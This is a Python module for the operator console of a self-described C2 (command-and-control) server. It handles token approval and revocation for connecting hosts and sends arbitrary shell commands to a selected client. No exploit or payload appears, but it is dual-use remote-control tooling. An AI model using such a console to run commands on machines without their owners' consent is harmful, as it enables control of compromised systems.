"""
Operator CLI Module
Interactive command-line interface for C2 operators
"""
import sys
from datetime import datetime
from server.client_handler import (
    send_command_to_client,
    get_hostname_by_number,
    clients_lock,
    clients
)
from server.logger_config import logger
from server import token_manager
from common.protocol import send_message


# ANSI Color codes for better UX
class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'

    @staticmethod
    def disable():
        """Disable colors for systems that don't support ANSI"""
        Colors.RESET = ''
        Colors.RED = ''
        Colors.GREEN = ''
        Colors.YELLOW = ''
        Colors.BLUE = ''
        Colors.MAGENTA = ''
        Colors.CYAN = ''
        Colors.BOLD = ''


# Global session state
active_session = None


def show_help():
    """Display context-aware help information"""
    # Get current state for context-aware tips
    pending_count = len(token_manager.get_pending_requests())
    with clients_lock:
        client_list = [(idx, hostname, info) for idx, (hostname, info) in enumerate(clients.items(), 1)]

    print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*70}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}  C2 SERVER - COMMAND REFERENCE{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}{'='*70}{Colors.RESET}\n")

    # Token Management Section
    print(f"{Colors.YELLOW}{Colors.BOLD}📋 TOKEN MANAGEMENT:{Colors.RESET}")
    print(f"  {Colors.BOLD}pending{Colors.RESET}                 - List pending token requests")
    print(f"  {Colors.BOLD}approve <#|hostname>{Colors.RESET}    - Approve a token request")
    print(f"  {Colors.BOLD}deny <#|hostname>{Colors.RESET}       - Deny a token request")
    print(f"  {Colors.BOLD}addtoken <hostname>{Colors.RESET}     - Manually create a new token")
    print(f"  {Colors.BOLD}revoke <#|hostname>{Colors.RESET}     - Revoke client access (temporary)")
    print(f"  {Colors.BOLD}renew <hostname>{Colors.RESET}        - Renew a revoked token")
    print(f"  {Colors.BOLD}delete <#|hostname>{Colors.RESET}     - Permanently delete token")
    print(f"  {Colors.BOLD}tokens{Colors.RESET}                  - List all tokens with status")

    # Client Management Section
    print(f"\n{Colors.GREEN}{Colors.BOLD}💻 CLIENT MANAGEMENT:{Colors.RESET}")
    print(f"  {Colors.BOLD}list / sessions{Colors.RESET}         - Show all clients and tokens")
    print(f"  {Colors.BOLD}use <#|hostname>{Colors.RESET}        - Select and interact with a client")
    print(f"  {Colors.BOLD}help{Colors.RESET}                    - Show this help message")
    print(f"  {Colors.BOLD}exit{Colors.RESET}                    - Shutdown server")

    # Session Commands Section
    print(f"\n{Colors.MAGENTA}{Colors.BOLD}🔧 SESSION COMMANDS (when connected to a client):{Colors.RESET}")
    print(f"  {Colors.BOLD}<any command>{Colors.RESET}           - Execute command on client")
    print(f"  {Colors.BOLD}back / exit / q{Colors.RESET}         - Exit current session")
    print(f"\n{Colors.YELLOW}  💡 Smart Disambiguation:{Colors.RESET}")
    print(f"     When you type {Colors.BOLD}list{Colors.RESET}, {Colors.BOLD}help{Colors.RESET}, or similar commands in a session,")
    print(f"     you'll be asked whether you want to run it on the client or server.")

    # Examples Section with Context
    print(f"\n{Colors.CYAN}{Colors.BOLD}📚 EXAMPLES:{Colors.RESET}")

    if pending_count > 0:
        print(f"  {Colors.YELLOW}You have {pending_count} pending request(s)! Try:{Colors.RESET}")
        print(f"     {Colors.BOLD}pending{Colors.RESET}          - View pending token requests")
        print(f"     {Colors.BOLD}approve 1{Colors.RESET}        - Approve first pending request")

    if client_list:
        example_hostname = client_list[0][1]
        print(f"  {Colors.GREEN}You have {len(client_list)} connected client(s)! Try:{Colors.RESET}")
        print(f"     {Colors.BOLD}use 1{Colors.RESET}            - Connect to {example_hostname}")
        print(f"     {Colors.BOLD}list{Colors.RESET}             - See all connected clients")

    if pending_count == 0 and not client_list:
        print(f"  {Colors.CYAN}Getting started:{Colors.RESET}")
        print(f"     {Colors.BOLD}list{Colors.RESET}             - Check system status")
        print(f"     {Colors.BOLD}pending{Colors.RESET}          - View token requests")
        print(f"  {Colors.CYAN}After a client connects:{Colors.RESET}")
        print(f"     {Colors.BOLD}use 1{Colors.RESET}            - Connect to first client")
        print(f"     {Colors.BOLD}whoami{Colors.RESET}           - Run command on client")

    # Quick Tips
    print(f"\n{Colors.MAGENTA}{Colors.BOLD}💡 QUICK TIPS:{Colors.RESET}")
    print(f"  • Use numbers instead of hostnames: {Colors.BOLD}use 1{Colors.RESET} vs {Colors.BOLD}use DESKTOP-ABC{Colors.RESET}")
    print(f"  • Type {Colors.BOLD}list{Colors.RESET} to see an overview of everything")
    print(f"  • Commands support both # and hostname: {Colors.BOLD}approve 1{Colors.RESET} or {Colors.BOLD}approve DESKTOP-ABC{Colors.RESET}")

    print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*70}{Colors.RESET}\n")


def list_clients():
    """Display comprehensive overview: all clients organized by status"""
    print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*90}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}  C2 SERVER - CLIENT OVERVIEW{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}{'='*90}{Colors.RESET}\n")

    # Get all tokens from database
    all_tokens = token_manager.get_all_tokens()

    # Get currently connected clients
    with clients_lock:
        connected_hostnames = set(clients.keys())
        connected_clients_info = dict(clients)

    # Organize clients by status
    approved_connected = []
    approved_disconnected = []
    pending_clients = []
    revoked_clients = []
    denied_clients = []

    for token_info in all_tokens:
        hostname, status, ip_address, requested_at, approved_at, revoked_at = token_info

        if status == 'approved':
            if hostname in connected_hostnames:
                approved_connected.append((hostname, ip_address, approved_at, connected_clients_info[hostname]))
            else:
                approved_disconnected.append((hostname, ip_address, approved_at))
        elif status == 'pending':
            pending_clients.append((hostname, ip_address, requested_at))
        elif status == 'revoked':
            revoked_clients.append((hostname, ip_address, revoked_at))
        elif status == 'denied':
            denied_clients.append((hostname, ip_address, requested_at))

    # Section 1: Active & Connected Clients
    print(f"{Colors.GREEN}{Colors.BOLD}● ACTIVE CLIENTS (Connected & Authenticated){Colors.RESET}")
    print(f"{Colors.CYAN}{'─'*90}{Colors.RESET}")

    if not approved_connected:
        print(f"  {Colors.YELLOW}No active clients{Colors.RESET}")
    else:
        print(f"  {'#':<4} {'HOSTNAME':<25} {'STATUS':<15} {'SESSION':<12} {'IP ADDRESS':<20}")
        print(f"  {Colors.CYAN}{'-'*86}{Colors.RESET}")
        for idx, (hostname, ip_address, approved_at, client_info) in enumerate(approved_connected, 1):
            addr = client_info['address']
            session_id = client_info['session_id']
            ip_str = f"{addr[0]}:{addr[1]}"
            status_text = "✓ Online"
            print(f"  {Colors.GREEN}[{idx}]{Colors.RESET}  {Colors.BOLD}{hostname:<25}{Colors.RESET} "
                  f"{Colors.GREEN}{status_text:<15}{Colors.RESET} {Colors.YELLOW}{session_id:<12}{Colors.RESET} "
                  f"{Colors.CYAN}{ip_str}{Colors.RESET}")

    print()

    # Section 2: Approved but Offline
    print(f"{Colors.BLUE}{Colors.BOLD}● APPROVED CLIENTS (Offline){Colors.RESET}")
    print(f"{Colors.CYAN}{'─'*90}{Colors.RESET}")

    if not approved_disconnected:
        print(f"  {Colors.GREEN}No offline approved clients{Colors.RESET}")
    else:
        print(f"  {'HOSTNAME':<25} {'STATUS':<15} {'IP ADDRESS':<20} {'APPROVED':<20}")
        print(f"  {Colors.CYAN}{'-'*86}{Colors.RESET}")
        for hostname, ip_address, approved_at in approved_disconnected:
            ip_str = ip_address if ip_address else "unknown"
            status_text = "✓ Offline"
            print(f"  {Colors.BOLD}{hostname:<25}{Colors.RESET} "
                  f"{Colors.BLUE}{status_text:<15}{Colors.RESET} "
                  f"{Colors.CYAN}{ip_str:<20}{Colors.RESET} {approved_at}")

    print()

    # Section 3: Pending Requests
    print(f"{Colors.YELLOW}{Colors.BOLD}● PENDING REQUESTS (Awaiting Approval){Colors.RESET}")
    print(f"{Colors.CYAN}{'─'*90}{Colors.RESET}")

    if not pending_clients:
        print(f"  {Colors.GREEN}No pending requests{Colors.RESET}")
    else:
        print(f"  {'HOSTNAME':<25} {'STATUS':<15} {'IP ADDRESS':<20} {'REQUESTED':<20}")
        print(f"  {Colors.CYAN}{'-'*86}{Colors.RESET}")
        for hostname, ip_address, requested_at in pending_clients:
            ip_str = ip_address if ip_address else "unknown"
            status_text = "⏳ Pending"
            print(f"  {Colors.BOLD}{hostname:<25}{Colors.RESET} "
                  f"{Colors.YELLOW}{status_text:<15}{Colors.RESET} "
                  f"{Colors.CYAN}{ip_str:<20}{Colors.RESET} {requested_at}")
        print(f"\n  {Colors.YELLOW}→ Use 'approve <#|hostname>' to approve{Colors.RESET}")

    print()

    # Section 4: Revoked & Denied (always show this section)
    print(f"{Colors.RED}{Colors.BOLD}● REVOKED / DENIED CLIENTS{Colors.RESET}")
    print(f"{Colors.CYAN}{'─'*90}{Colors.RESET}")

    if not revoked_clients and not denied_clients:
        print(f"  {Colors.GREEN}No revoked or denied clients{Colors.RESET}")
    else:
        if revoked_clients:
            print(f"  {Colors.RED}Revoked ({len(revoked_clients)}):{Colors.RESET}")
            for hostname, ip_address, revoked_at in revoked_clients:
                ip_str = ip_address if ip_address else "unknown"
                print(f"    • {Colors.BOLD}{hostname}{Colors.RESET} {Colors.CYAN}({ip_str}){Colors.RESET} - {revoked_at}")
            print()

        if denied_clients:
            print(f"  {Colors.RED}Denied ({len(denied_clients)}):{Colors.RESET}")
            for hostname, ip_address, requested_at in denied_clients:
                ip_str = ip_address if ip_address else "unknown"
                print(f"    • {Colors.BOLD}{hostname}{Colors.RESET} {Colors.CYAN}({ip_str}){Colors.RESET} - {requested_at}")

    print()

    print(f"{Colors.CYAN}{Colors.BOLD}{'='*90}{Colors.RESET}\n")

    # Quick action hints
    print(f"{Colors.YELLOW}📋 AVAILABLE COMMANDS:{Colors.RESET}")
    if pending_clients:
        print(f"  {Colors.GREEN}approve <#|hostname>{Colors.RESET}  - Approve a pending request")
        print(f"  {Colors.RED}deny <#|hostname>{Colors.RESET}     - Deny a pending request")
    if approved_connected:
        print(f"  {Colors.CYAN}use <#|hostname>{Colors.RESET}      - Connect to an active client")
    if approved_connected or approved_disconnected:
        print(f"  {Colors.RED}revoke <#|hostname>{Colors.RESET}   - Revoke client access and kick")
        print(f"  {Colors.RED}delete <#|hostname>{Colors.RESET}   - Permanently delete token and kick")
    if revoked_clients:
        print(f"  {Colors.BLUE}renew <hostname>{Colors.RESET}      - Renew a revoked token")
    print(f"  {Colors.MAGENTA}addtoken <hostname>{Colors.RESET}   - Manually create a new token")
    print()


def list_pending_requests():
    """Display all pending token requests"""
    pending = token_manager.get_pending_requests()

    if not pending:
        print(f"\n{Colors.YELLOW}[*] No pending token requests{Colors.RESET}\n")
        return

    print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}  Pending Token Requests{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")

    for idx, (hostname, ip_address, requested_at) in enumerate(pending, 1):
        ip_str = ip_address if ip_address else "unknown"
        print(f"  {Colors.YELLOW}[{idx}]{Colors.RESET} {Colors.BOLD}{hostname}{Colors.RESET} "
              f"{Colors.CYAN}({ip_str}){Colors.RESET} - {Colors.GREEN}{requested_at}{Colors.RESET}")

    print(f"{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}\n")
    print(f"{Colors.GREEN}Use 'approve <#|hostname>' to approve a request{Colors.RESET}\n")


def list_all_tokens():
    """Display all tokens with their status"""
    all_tokens = token_manager.get_all_tokens()

    if not all_tokens:
        print(f"\n{Colors.YELLOW}[*] No tokens in database{Colors.RESET}\n")
        return

    print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*80}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}  All Tokens{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}{'='*80}{Colors.RESET}")

    for idx, (hostname, status, ip_address, requested_at, approved_at, revoked_at) in enumerate(all_tokens, 1):
        ip_str = ip_address if ip_address else "unknown"

        # Color status
        if status == 'approved':
            status_str = f"{Colors.GREEN}{status}{Colors.RESET}"
        elif status == 'pending':
            status_str = f"{Colors.YELLOW}{status}{Colors.RESET}"
        elif status == 'revoked':
            status_str = f"{Colors.RED}{status}{Colors.RESET}"
        elif status == 'denied':
            status_str = f"{Colors.RED}{status}{Colors.RESET}"
        else:
            status_str = status

        # Format timestamp
        if approved_at:
            time_str = f"Approved: {approved_at}"
        elif revoked_at:
            time_str = f"Revoked: {revoked_at}"
        else:
            time_str = f"Requested: {requested_at}"

        print(f"  {Colors.BOLD}[{idx}] {hostname}{Colors.RESET} - {status_str} - "
              f"{Colors.CYAN}({ip_str}){Colors.RESET} - {Colors.GREEN}{time_str}{Colors.RESET}")

    print(f"{Colors.CYAN}{Colors.BOLD}{'='*80}{Colors.RESET}\n")


def get_pending_hostname_by_number(number):
    """
    Convert pending request number to hostname

    Args:
        number: Request number (as string or int)

    Returns:
        str: Hostname or None if not found
    """
    try:
        num = int(number)
        pending = token_manager.get_pending_requests()

        if 1 <= num <= len(pending):
            return pending[num - 1][0]  # Return hostname
        return None
    except (ValueError, IndexError):
        return None


def approve_token(target):
    """Approve a token request (supports number or hostname)"""
    # Try to resolve number to hostname
    hostname = get_pending_hostname_by_number(target) or target

    success, token = token_manager.approve_token(hostname)

    if success:
        print(f"{Colors.GREEN}[+] Token approved for {hostname}{Colors.RESET}")
        print(f"{Colors.CYAN}    Token: {token[:16]}...{Colors.RESET}")
        logger.info(f"Token approved for {hostname}")
    else:
        print(f"{Colors.RED}[!] Failed to approve token for {hostname} (not found){Colors.RESET}")


def deny_token(target):
    """Deny a token request (supports number or hostname)"""
    # Try to resolve number to hostname
    hostname = get_pending_hostname_by_number(target) or target

    success = token_manager.deny_token(hostname)

    if success:
        print(f"{Colors.YELLOW}[+] Token denied for {hostname}{Colors.RESET}")
        logger.info(f"Token denied for {hostname}")
    else:
        print(f"{Colors.RED}[!] Failed to deny token for {hostname} (not found){Colors.RESET}")


def revoke_token(target):
    """Revoke an approved token and kick client if connected"""
    # Try to resolve as number first
    hostname = get_hostname_by_number(target)
    if not hostname:
        hostname = target  # Treat as hostname

    success = token_manager.revoke_token(hostname)

    if success:
        print(f"{Colors.RED}[+] Token revoked for {hostname}{Colors.RESET}")
        logger.info(f"Token revoked for {hostname}")

        # Check if client is currently connected and kick them
        with clients_lock:
            if hostname in clients:
                client_info = clients[hostname]
                client_socket = client_info['socket']
                session_id = client_info['session_id']

                try:
                    # Send revocation notice to client
                    from common.config import MSG_TOKEN_STATUS, TOKEN_REVOKED
                    send_message(client_socket, f"{MSG_TOKEN_STATUS}:{TOKEN_REVOKED}")
                    logger.info(f"[SESSION:{session_id}] Sent revocation notice to {hostname}")
                    print(f"{Colors.YELLOW}[*] Kicked {hostname} from server{Colors.RESET}")
                except:
                    pass

                # Client handler will clean up the connection
    else:
        print(f"{Colors.RED}[!] Failed to revoke token for {target} (not found){Colors.RESET}")


def add_token_manual(hostname):
    """Manually add and approve a token"""
    success, token = token_manager.add_token_manual(hostname)

    if success:
        print(f"{Colors.GREEN}[+] Token created and approved for {hostname}{Colors.RESET}")
        print(f"{Colors.CYAN}    Token: {token}{Colors.RESET}")
        print(f"{Colors.YELLOW}    Client should save this token to 'client_token.txt'{Colors.RESET}")
        logger.info(f"Token manually added for {hostname}")
    else:
        print(f"{Colors.RED}[!] Failed to create token for {hostname}{Colors.RESET}")


def delete_token(target):
    """Permanently delete a client token from database and kick client"""
    # Try to resolve as number first
    hostname = get_hostname_by_number(target)
    if not hostname:
        hostname = target  # Treat as hostname

    # Check if token exists
    token, status = token_manager.get_token_by_hostname(hostname)

    if not token:
        print(f"{Colors.RED}[!] No token found for {target}{Colors.RESET}")
        return

    # Confirm deletion
    print(f"{Colors.YELLOW}⚠️  WARNING: This will permanently delete the token for {hostname}{Colors.RESET}")
    print(f"    Status: {status}")
    confirm = input(f"    Type 'yes' to confirm deletion: ").strip().lower()

    if confirm != 'yes':
        print(f"{Colors.YELLOW}[*] Deletion cancelled{Colors.RESET}")
        return

    # Check if client is connected and kick them first
    with clients_lock:
        if hostname in clients:
            client_info = clients[hostname]
            client_socket = client_info['socket']
            session_id = client_info['session_id']

            try:
                # Send deletion notice to client
                from common.config import MSG_TOKEN_STATUS
                send_message(client_socket, f"{MSG_TOKEN_STATUS}:deleted")
                logger.info(f"[SESSION:{session_id}] Sent deletion notice to {hostname}")
                print(f"{Colors.YELLOW}[*] Kicked {hostname} from server{Colors.RESET}")
            except:
                pass

    # Delete token from database
    success = token_manager.delete_token(hostname)

    if success:
        print(f"{Colors.GREEN}[+] Token permanently deleted for {hostname}{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Client must request a new token to reconnect{Colors.RESET}")
        logger.info(f"Token deleted for {hostname}")
    else:
        print(f"{Colors.RED}[!] Failed to delete token for {hostname}{Colors.RESET}")


def renew_token(target):
    """Renew a revoked token (re-approve without creating new token)"""
    # Try to resolve as number first
    hostname = get_hostname_by_number(target)
    if not hostname:
        hostname = target  # Treat as hostname

    # Check if token exists and is revoked
    token, status = token_manager.get_token_by_hostname(hostname)

    if not token:
        print(f"{Colors.RED}[!] No token found for {target}{Colors.RESET}")
        return

    if status != 'revoked':
        print(f"{Colors.YELLOW}[!] Token for {hostname} is not revoked (status: {status}){Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Only revoked tokens can be renewed{Colors.RESET}")
        return

    # Approve the existing token (change status from revoked to approved)
    success, _ = token_manager.approve_token(hostname)

    if success:
        print(f"{Colors.GREEN}[+] Token renewed for {hostname}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Client can reconnect with their existing token{Colors.RESET}")
        logger.info(f"Token renewed for {hostname}")
    else:
        print(f"{Colors.RED}[!] Failed to renew token for {hostname}{Colors.RESET}")


def disambiguate_command(cmd, hostname):
    """
    Handle ambiguous commands when in a session
    Commands like 'list' and 'help' could be intended for either server or client

    Args:
        cmd: The command entered
        hostname: The active session hostname

    Returns:
        str: 'server', 'client', or 'cancel'
    """
    # Map commands to their descriptions
    command_descriptions = {
        'list': ('list directory contents', 'show server client list'),
        'sessions': ('run sessions command', 'show server client list'),
        'help': ('get help on client', 'show server command reference'),
        'pending': ('run pending command', 'show pending token requests'),
        'tokens': ('run tokens command', 'show all tokens'),
    }

    client_desc, server_desc = command_descriptions.get(cmd, ('run on client', 'run server command'))

    print(f"\n{Colors.YELLOW}⚠️  Ambiguous command '{Colors.BOLD}{cmd}{Colors.RESET}{Colors.YELLOW}'{Colors.RESET}")
    print(f"{Colors.CYAN}[1]{Colors.RESET} Run '{Colors.BOLD}{cmd}{Colors.RESET}' on client {Colors.GREEN}{hostname}{Colors.RESET} ({client_desc})")
    print(f"{Colors.CYAN}[2]{Colors.RESET} Execute server command ({server_desc})")
    print(f"{Colors.CYAN}[3]{Colors.RESET} Cancel")
    print()

    while True:
        try:
            choice = input(f"{Colors.BOLD}Choice (1/2/3):{Colors.RESET} ").strip()

            if choice == '1':
                return 'client'
            elif choice == '2':
                return 'server'
            elif choice == '3':
                return 'cancel'
            else:
                print(f"{Colors.RED}Invalid choice. Please enter 1, 2, or 3{Colors.RESET}")
        except (KeyboardInterrupt, EOFError):
            print()
            return 'cancel'


def display_command_output(hostname, stdout, stderr):
    """Display command results with colored formatting"""
    print(f"\n{Colors.CYAN}{'='*50}{Colors.RESET}")
    print(f"{Colors.BOLD}Output from {hostname}{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
    if stdout:
        print(f"{Colors.GREEN}STDOUT:{Colors.RESET}")
        print(stdout)
    if stderr:
        print(f"{Colors.RED}STDERR:{Colors.RESET}")
        print(stderr)
    print(f"{Colors.CYAN}{'='*50}{Colors.RESET}\n")


def operator_cli():
    """Interactive CLI for operator"""
    global active_session

    print(f"\n{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.RESET}")
    print(f"{Colors.GREEN}{Colors.BOLD}  🎯 C2 OPERATOR CONSOLE - READY{Colors.RESET}")
    print(f"{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.RESET}\n")

    print(f"{Colors.CYAN}Welcome! The C2 server is now running.{Colors.RESET}")
    print(f"{Colors.CYAN}Waiting for clients to connect...{Colors.RESET}\n")

    print(f"{Colors.YELLOW}Quick Start:{Colors.RESET}")
    print(f"  • Type {Colors.BOLD}help{Colors.RESET} to see all commands")
    print(f"  • Type {Colors.BOLD}list{Colors.RESET} to check system status")
    print(f"  • When a client connects, you'll see a notification!")

    print(f"\n{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.RESET}\n")

    while True:
        try:
            # Build prompt with pending count
            pending_count = len(token_manager.get_pending_requests())
            if active_session:
                if pending_count > 0:
                    prompt = f"{Colors.MAGENTA}[{active_session}]{Colors.RESET} {Colors.YELLOW}({pending_count} pending){Colors.RESET} > "
                else:
                    prompt = f"{Colors.MAGENTA}[{active_session}]{Colors.RESET}> "
            else:
                if pending_count > 0:
                    prompt = f"{Colors.BOLD}c2{Colors.RESET} {Colors.YELLOW}({pending_count} pending){Colors.RESET} > "
                else:
                    prompt = f"{Colors.BOLD}c2{Colors.RESET}> "

            cmd = input(prompt).strip()

            if not cmd:
                continue

            # Define ambiguous commands (could be for server OR client)
            AMBIGUOUS_COMMANDS = ['list', 'sessions', 'help', 'pending', 'tokens']

            # Clear exit commands - handle immediately without prompting
            if cmd in ['exit', 'quit']:
                if active_session:
                    # In session, exit means exit session
                    logger.info(f"Session closed: {active_session}")
                    print(f"{Colors.YELLOW}[*] Session closed{Colors.RESET}")
                    active_session = None
                else:
                    # Not in session, exit means shutdown
                    logger.info("Operator initiated shutdown")
                    sys.exit(0)
                continue

            elif cmd in ['back', 'q']:
                if active_session:
                    with clients_lock:
                        if active_session in clients:
                            session_id = clients[active_session]['session_id']
                            logger.info(f"[SESSION:{session_id}] Session closed: {active_session}")
                        else:
                            logger.info(f"Session closed: {active_session}")
                    print(f"{Colors.YELLOW}[*] Session closed{Colors.RESET}")
                    active_session = None
                else:
                    print(f"{Colors.RED}[!] No active session{Colors.RESET}")
                continue

            # If in a session, check for ambiguous commands
            if active_session:
                # Check if this is an ambiguous command
                if cmd in AMBIGUOUS_COMMANDS or cmd == '?':
                    # Ask user what they want to do
                    choice = disambiguate_command(cmd if cmd != '?' else 'help', active_session)

                    if choice == 'cancel':
                        continue
                    elif choice == 'client':
                        # Send to client
                        stdout, stderr = send_command_to_client(active_session, cmd)

                        if stdout is None:
                            print(f"{Colors.RED}[!] {stderr}{Colors.RESET}")
                            # Check if client disconnected
                            if stderr and "disconnected" in stderr.lower():
                                logger.warning(f"Session closed: {active_session} (client disconnected)")
                                active_session = None
                        else:
                            display_command_output(active_session, stdout, stderr)
                        continue
                    # If choice == 'server', fall through to execute server command below

                # Check for commands that start with prefixes (like 'use ', 'approve ', etc.)
                elif cmd.startswith(('use ', 'approve ', 'deny ', 'revoke ', 'addtoken ', 'delete ', 'renew ')):
                    # These are clearly server commands, execute them
                    pass  # Fall through to server command handling

                else:
                    # Not ambiguous, not a server command - send to client
                    stdout, stderr = send_command_to_client(active_session, cmd)

                    if stdout is None:
                        print(f"{Colors.RED}[!] {stderr}{Colors.RESET}")
                        # Check if client disconnected
                        if stderr and "disconnected" in stderr.lower():
                            logger.warning(f"Session closed: {active_session} (client disconnected)")
                            active_session = None
                    else:
                        display_command_output(active_session, stdout, stderr)
                    continue

            # Server commands (executed when NOT in session, or when user chose 'server' option)
            if cmd in ['list', 'sessions']:
                list_clients()

            elif cmd == 'pending':
                list_pending_requests()

            elif cmd == 'tokens':
                list_all_tokens()

            elif cmd.startswith('approve '):
                hostname = cmd.split(' ', 1)[1].strip()
                approve_token(hostname)

            elif cmd.startswith('deny '):
                hostname = cmd.split(' ', 1)[1].strip()
                deny_token(hostname)

            elif cmd.startswith('revoke '):
                hostname = cmd.split(' ', 1)[1].strip()
                revoke_token(hostname)

            elif cmd.startswith('addtoken '):
                hostname = cmd.split(' ', 1)[1].strip()
                add_token_manual(hostname)

            elif cmd.startswith('delete '):
                hostname = cmd.split(' ', 1)[1].strip()
                delete_token(hostname)

            elif cmd.startswith('renew '):
                hostname = cmd.split(' ', 1)[1].strip()
                renew_token(hostname)

            elif cmd in ['help', '?']:
                show_help()

            elif cmd.startswith('use '):
                target = cmd.split(' ', 1)[1].strip()

                # Try to resolve as number first, then as hostname
                hostname = get_hostname_by_number(target)
                if not hostname:
                    hostname = target  # Treat as hostname

                with clients_lock:
                    if hostname in clients:
                        # Check if already in this session
                        if active_session == hostname:
                            print(f"{Colors.YELLOW}[*] Already in session with {hostname}{Colors.RESET}")
                        else:
                            # Check if switching from another session
                            if active_session:
                                old_session = active_session
                                if old_session in clients:
                                    old_session_id = clients[old_session]['session_id']
                                    logger.info(f"[SESSION:{old_session_id}] Session closed: {old_session}")
                                    print(f"{Colors.YELLOW}[*] Closed session with {old_session}{Colors.RESET}")

                            # Open new session
                            active_session = hostname
                            session_id = clients[hostname]['session_id']
                            logger.info(f"[SESSION:{session_id}] Session opened: {hostname}")
                            print(f"{Colors.GREEN}[+] Session opened with {hostname}{Colors.RESET}")
                    else:
                        print(f"{Colors.RED}[!] Client '{target}' not found{Colors.RESET}")

            else:
                print(f"{Colors.RED}[!] Unknown command{Colors.RESET}")

        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Use 'exit' to quit{Colors.RESET}")
        except EOFError:
            break
        except Exception as e:
            logger.error(f"CLI error: {e}")
            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
